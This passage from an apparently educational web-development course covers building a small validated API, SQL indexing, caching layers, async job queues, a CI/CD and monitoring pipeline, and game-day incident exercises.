**Try it:** Write a runbook for the most likely alert in your app. Then hand it to a colleague unfamiliar with the system and watch them follow it against a staging environment. Fix every place they hesitated.

**Resources**
- [Google SRE Book: Being on-call](https://sre.google/sre-book/being-on-call/)
- [Google SRE Workbook: On-call](https://sre.google/workbook/on-call/)
- [PagerDuty Incident Response: Being on-call](https://response.pagerduty.com/oncall/being_oncall/)

### Build an API

Building a small API yourself is the fastest way to understand what you have been consuming: why validation errors look the way they do, where latency comes from, and what the backend team means by "idempotent". A complete small service has routing, input validation, a database, consistent errors, and correct HTTP semantics.

A minimal example with Hono, Zod, and Node's built-in SQLite module (check its stability status for your Node version; `better-sqlite3` or Postgres are the usual production choices):

```js
import { serve } from '@hono/node-server';
import { Hono } from 'hono';
import { DatabaseSync } from 'node:sqlite';
import * as z from 'zod';

const db = new DatabaseSync('app.db');
db.exec(`CREATE TABLE IF NOT EXISTS todos (
  id INTEGER PRIMARY KEY,
  title TEXT NOT NULL,
  done INTEGER NOT NULL DEFAULT 0
)`);

const NewTodo = z.object({ title: z.string().trim().min(1).max(200) });
const app = new Hono();

app.get('/todos', (c) => c.json(db.prepare('SELECT id, title, done FROM todos ORDER BY id').all()));

app.post('/todos', async (c) => {
  const parsed = NewTodo.safeParse(await c.req.json().catch(() => null));
  if (!parsed.success) {
    return c.json({ title: 'Invalid request body', issues: parsed.error.issues }, 400);
  }
  const result = db.prepare('INSERT INTO todos (title) VALUES (?)').run(parsed.data.title);
  return c.json({ id: Number(result.lastInsertRowid), title: parsed.data.title, done: 0 }, 201);
});

serve({ fetch: app.fetch, port: 3000 });
```

What this demonstrates, and what to add:

- **Never trust input.** Parse the body against a schema at the edge of the system; everything after that works with typed, valid data. Validation on the client is for user experience; the server's is for safety.
- **Parameterised queries.** The `?` placeholders prevent SQL injection. Never build SQL by concatenating user input.
- **Status codes that mean something.** 200, 201 with the created resource, 204, 400 for malformed input, 401 not authenticated, 403 not allowed, 404, 409 conflict, 422 semantically invalid, 429 rate limited, 5xx for the server's own faults.
- **One error format** for every failure, with a machine-readable code.
- **REST resource design.** Nouns for URLs, methods for actions; `GET` is safe, `PUT` and `DELETE` are idempotent, `POST` is not unless you support an idempotency key.
- **Pagination, filtering, and limits** on every list endpoint from the first version.
- **Operational basics.** A health endpoint, structured request logs with a request ID, timeouts, CORS configured for specific origins, rate limiting, auth, and graceful shutdown.

Test it with requests against the running app rather than by mocking internals.

**Try it:** Run the example, then exercise it with `curl`: create a todo, send an empty title and an invalid JSON body, and check each status code. Add `PATCH /todos/:id` with validation and a 404 for unknown IDs.

**Resources**
- [Hono docs](https://hono.dev/docs/)
- [Zod docs](https://zod.dev/)
- [Node.js docs: SQLite](https://nodejs.org/api/sqlite.html)

### Databases

Most slow screens are slow because of a query. Knowing a little SQL and how indexes work lets you see that in the Network panel, describe it precisely to backend colleagues, and avoid designing UI that forces expensive queries.

The essentials of SQL: `SELECT` columns `FROM` a table `WHERE` conditions, `JOIN` to combine tables on a key, `GROUP BY` with aggregates such as `COUNT`, `ORDER BY`, and `LIMIT`. Transactions make several statements succeed or fail as a unit.

**Indexes.** Without an index, the database reads every row to find matches (a sequential scan), which is fine for a thousand rows and slow for ten million. An index is a sorted structure (usually a B-tree) that lets it jump to the matching rows, at the cost of extra work on every write and extra storage.

```sql
-- The query behind "my recent posts"
SELECT id, title, created_at
FROM posts
WHERE author_id = 42
ORDER BY created_at DESC
LIMIT 20;

-- A composite index that serves both the filter and the sort
CREATE INDEX posts_author_created_idx ON posts (author_id, created_at DESC);

-- Ask the database what it actually does
EXPLAIN ANALYZE
SELECT id, title, created_at FROM posts
WHERE author_id = 42 ORDER BY created_at DESC LIMIT 20;
```

Column order in a composite index matters: it serves queries that filter on its leading columns. `EXPLAIN ANALYZE` shows the plan and real timings; "Seq Scan" on a big table in a hot query is the thing to look for.

How queries shape UI latency:

- **N+1 queries.** Fetching a list, then one query per row for related data. Twenty rows become twenty-one queries. From the frontend it looks like a list endpoint whose time grows with page size. ORMs make this easy to write by accident.
- **Offset pagination.** `OFFSET 100000` makes the database produce and discard 100,000 rows, so deep pages get slower. Keyset (cursor) pagination filters by the last seen value (`WHERE (created_at, id) < ($1, $2)`) and stays fast at any depth.
- **Unindexed search, sort, and filter.** Every sortable column and filter in your table UI is a query the database must support. `LIKE '%term%'` cannot use an ordinary index; real search needs full-text indexing.
- **Counts.** "Showing 1 to 20 of 1,284,113" requires counting every match, which is often slower than the page itself. Consider "more than 1,000" or no total.
- **Over-fetching.** `SELECT *` with large columns sends data the UI never shows.
- **Round trips and distance.** Each query has network latency; a server far from its database multiplies it.

**Try it:** Create a table with 500,000 rows in Postgres or SQLite, run a filtered and sorted query with `EXPLAIN ANALYZE` (or `EXPLAIN QUERY PLAN` in SQLite), add an index, and run it again. Record the plan and timing before and after.

**Resources**
- [PostgreSQL docs: Using EXPLAIN](https://www.postgresql.org/docs/current/using-explain.html)
- [PostgreSQL docs: Indexes](https://www.postgresql.org/docs/current/indexes.html)
- [Use The Index, Luke: Paging through results](https://use-the-index-luke.com/no-offset)

### Caching layers

Between a user's click and the database there may be five caches, each holding a copy with its own lifetime. When someone reports "I changed it but still see the old value", the job is working out which layer is serving the stale copy.

From the user inward:

1. **In-memory client cache**: your query library or framework's client cache, governed by stale time and invalidation.
2. **Browser HTTP cache and service worker**: governed by `Cache-Control`, `ETag`, and your service worker's strategy.
3. **CDN or edge cache**: shared by all users, governed by `s-maxage`, `CDN-Cache-Control`, cache keys, and purges.
4. **Framework or server cache**: rendered pages and fetched data cached by the application server (for example, incremental static regeneration or a data cache), revalidated by time or by tag.
5. **Application cache (Redis or Memcached)**: an in-memory key-value store next to the application servers, holding results of expensive queries, sessions, rate-limit counters. The usual pattern is cache-aside: look in Redis; on a miss, query the database, store the result with a TTL, and return it.
6. **The database**, with its own buffer cache, and possibly read replicas that lag behind the primary.

Staleness accumulates. A response cached for 60 s in Redis, then 60 s at the CDN, then 60 s in the browser can be three minutes old. An update is visible only when every layer on the path has expired or been invalidated.

How this reaches the UI, and what to do:

- **Read-your-own-writes.** After a mutation the user must see their change, even if shared caches are still stale. Update or invalidate the client cache from the mutation response, and have the mutation purge server-side caches by key or tag. Reading from a lagging replica right after writing causes the same symptom.
- **Invalidate by event, expire by time.** TTLs bound staleness; explicit invalidation on write removes it. Use both: invalidation can fail, and TTL is the safety net.
- **`stale-while-revalidate`** serves the old copy instantly and refreshes in the background, trading a brief staleness for speed. Good for content, wrong for balances or stock at checkout.
- **Never cache personalised responses in a shared layer** without the user in the key.
- **Stampedes.** When a hot key expires, many requests recompute it at once. Mitigate with locks or by serving stale while one request refreshes.
- **Choose staleness per data type.** A product description can be minutes old; a price at checkout cannot. Agree this with product.

To diagnose, bypass layers one at a time: hard reload (browser cache), a cache-busting query string (CDN), response headers (`Age`, cache status), then the API directly.

**Try it:** Pick one piece of data in your app and trace it from database to screen. List every layer that may cache it and its lifetime, add them up for the worst case, then change the data and time how long the UI takes to show it.

**Resources**
- [MDN: HTTP caching](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Caching)
- [web.dev: Keeping things fresh with stale-while-revalidate](https://web.dev/articles/stale-while-revalidate)
- [AWS: Database caching strategies using Redis — caching patterns](https://docs.aws.amazon.com/whitepapers/latest/database-caching-strategies-using-redis/caching-patterns.html)

### Queues and async work

Some operations are too slow or too unreliable to finish inside one HTTP request: generating a report, transcoding video, sending thousands of emails, calling a slow third party, importing a file. Holding the connection open ties up a server, hits gateway and function timeouts, and gives the user no way to recover if the connection drops. Instead the server records the work, puts a job on a queue, and replies immediately:

```http
HTTP/1.1 202 Accepted
Location: /exports/8f3a
Content-Type: application/json

{ "id": "8f3a", "status": "queued" }
```

`202 Accepted` means "I have taken responsibility for this; it is not done". A separate worker process pulls jobs from the queue (SQS, RabbitMQ, a Redis-backed queue such as BullMQ, Cloudflare Queues), does the work, and records the outcome. The queue absorbs bursts, lets workers scale independently, and allows retries with backoff when something fails.

What follows for the frontend:

- **The result arrives later, so the UI needs a state machine**: queued, running (with progress if available), succeeded, failed. Design the failed and "still going after a long time" states, not just the happy path.
- **Finding out when it is done.** Poll the status resource with backoff (simple and robust), subscribe by SSE or WebSocket (immediate), or notify out of band (email, push) for long jobs. Whatever you choose, the job must survive the user closing the tab and be findable when they return.
- **Idempotency.** Queues generally guarantee at-least-once delivery, so a job may run twice, and users double-click. Send an idempotency key with the request so the server can discard duplicates, and disable the button while submitting.
- **Eventual consistency.** After a 202, a subsequent GET may not include the new thing yet. Show it optimistically or as "processing" rather than letting it appear absent.
- **Ordering.** Jobs may finish out of order; do not let an older result overwrite a newer one.
- **Failure is asynchronous too.** There is no error response to catch. Failures surface through the status resource or a notification, after retries are exhausted (when the job typically lands in a dead-letter queue for someone to inspect).

The same pattern covers webhooks from third parties, such as payment confirmation: the redirect back to your site is not proof of payment; the webhook is, and the UI should wait for or poll the confirmed state.

**Try it:** Build an endpoint that returns 202 with a job ID and completes the job after ten seconds, plus a status endpoint. Write the client: submit, poll with backoff, render each state, and handle a page reload mid-job.

**Resources**
- [MDN: 202 Accepted](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/202)
- [Microsoft Azure Architecture Center: Asynchronous Request-Reply pattern](https://learn.microsoft.com/en-us/azure/architecture/patterns/async-request-reply)
- [BullMQ docs](https://docs.bullmq.io/)

### Full pipeline

This project ties the module together: take one of your apps from "it works on my machine" to an operated service. Build it in this order, verifying each stage before the next.

1. **CI.** A workflow on every PR that runs lint, type-check, unit tests, and a production build, with dependency caching and a timeout. Make the checks required for merging.
2. **Preview deploys.** Connect the repo to a platform so every PR gets a URL. Give previews their own environment variables. Add a job that runs a couple of Playwright smoke tests against the preview URL.
3. **Production deploy.** Merging to `main` deploys automatically after CI passes. Inject the commit SHA as the release identifier at build time. Add a post-deploy smoke test against production.
4. **Caching and skew.** Verify the cache headers on HTML and hashed assets with `curl -sI`, and test that a tab opened before a deploy still works after it.
5. **Error tracking.** Add the SDK with `release` and `environment` set, upload source maps in CI, and remove them from the deployed output. Wrap the app in an error boundary that reports. Set alerts for new issues and regressions.
6. **RUM.** Report LCP, INP, and CLS with route, device, and release, either through the `web-vitals` library to your own endpoint or a platform product.
7. **Close the loop.** Write the rollback procedure down and perform it once. Add one synthetic check for the most important flow.

Evidence that it is done:

- A PR with a type error cannot be merged.
- A PR shows a preview link, and tests ran against it.
- A commit on `main` is live within minutes without anyone pressing a button.
- A thrown test error appears in the tracker with a readable stack trace and the correct release.
- You can show p75 LCP for one route, split by mobile and desktop, for the current release.
- You rolled back and it took under two minutes.

Keep secrets in the platform's and CI's secret stores, give tokens the least scope that works, and write a short `OPERATIONS.md` that tells a newcomer where everything is: dashboards, how to deploy, how to roll back, and who is alerted.

**Try it:** Start with stage 1 only and break it three ways (lint, types, test) in three PRs to prove each check blocks a merge. Do not move to stage 2 until all three are red when they should be.

**Resources**
- [GitHub Actions documentation](https://docs.github.com/en/actions)
- [Sentry docs: Source maps for JavaScript](https://docs.sentry.io/platforms/javascript/sourcemaps/)
- [web.dev: Best practices for measuring Web Vitals in the field](https://web.dev/articles/vitals-field-measurement-best-practices)

### Game day

A game day is a planned exercise in which you break your own system on purpose to find out whether detection, response, and recovery work as you believe. It is the practice session for incidents: you learn where the runbook is wrong and which alert never fires at a time you chose, rather than at 3am.

**Prepare.**

- Pick a scenario with a hypothesis: "If a deploy ships a JavaScript error on the checkout route, the error-rate alert fires within five minutes and we can roll back in under two."
- Limit the blast radius. Use a staging or personal deployment, or a flag exposing the fault to test users only. If you run it in production, pick a quiet time, tell everyone affected, and define an abort condition.
- Assign roles: a facilitator who injects the fault and observes, a responder who is on-call for the exercise and ideally does not know the scenario, and a note-taker.

**Scenarios suited to a frontend.**

- Deploy a build that throws on a critical route.
- Make an API endpoint return 500s or respond after ten seconds.
- Block a third-party script (analytics, payments, fonts) and see whether the page still works.
- Deploy while a tab is open and navigate to a lazy route (version skew).
- Break a required environment variable.
- Serve a response with a wrong `Cache-Control` header and then try to purge it.
- Expire or revoke a session mid-task.

**Run it.** Inject the fault and start a clock. Record: time to detect (did an alert fire, or did a human notice?), time to identify, time to mitigate, and time to verify recovery. The responder follows the real runbook and uses the real tools.

**Review.** Hold a blameless postmortem immediately. What was the gap between what you expected and what happened? Typical findings: the alert threshold was too high to fire, the alert went to a channel nobody watches, the dashboard did not show releases, the rollback command in the runbook was outdated, source maps were missing so the stack trace was unreadable, the responder lacked permission. Turn each into an action item with an owner, then rerun the same scenario later to confirm the fix.

Start small and increase difficulty. The aim is confidence that comes from evidence, and a team that has done a rollback so many times it is boring.

**Try it:** Deploy a version of your app that throws when a specific button is clicked. Without telling a teammate which button, ask them to find the problem using only your monitoring, roll back, and write a five-line postmortem. Time each phase.

**Resources**
- [Principles of Chaos Engineering](https://principlesofchaos.org/)
- [Google SRE Book: Postmortem culture](https://sre.google/sre-book/postmortem-culture/)
- [Google SRE Workbook: On-call](https://sre.google/workbook/on-call/)
